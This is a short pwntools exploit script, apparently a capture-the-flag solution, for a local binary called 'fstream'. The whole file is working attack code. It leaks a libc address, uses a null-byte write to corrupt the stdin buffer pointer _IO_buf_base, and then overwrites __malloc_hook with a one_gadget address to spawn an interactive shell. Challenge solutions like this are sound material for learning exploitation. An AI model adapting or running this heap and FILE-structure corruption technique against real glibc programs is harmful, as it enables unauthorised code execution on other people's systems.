from pwn import *
import time

payload = "11010110" + "a" * 0x90

p = process("./fstream")
p.sendafter("> ", payload)
p.sendafter("> ", payload)	# leak libc address
p.recvuntil(payload)
leak      = u64(p.recvuntil("> ")[:-2].ljust(8,"\x00"))
libc_base = leak - 0x20830
log.info("leak      : 0x%x" % leak)
log.info("libc base : 0x%x" % libc_base)
p.sendline("11111111")

# null byte poisoning at _IO_buf_base
_IO_buf_base = libc_base + 0x3c4918
to_write_null = _IO_buf_base
calc_addr = -(0x10000000000000000 - to_write_null - 1)
p.sendafter("> ", "10110101")
p.sendlineafter("> ", str(calc_addr))
pause()

# overwrite _IO_buf_base with malloc_hook
malloc_hook = libc_base + 0x3c4b10
payload = p64(malloc_hook)*4 + p64(malloc_hook + 0x20) + p64(0)
p.sendafter("> ", payload)
pause()

# overwrite malloc_hook with one_gadget
one_gadget = libc_base + 0xf66f0
payload = "\x00"*16 + p64(one_gadget)
p.sendafter("> ", payload)
p.interactive()
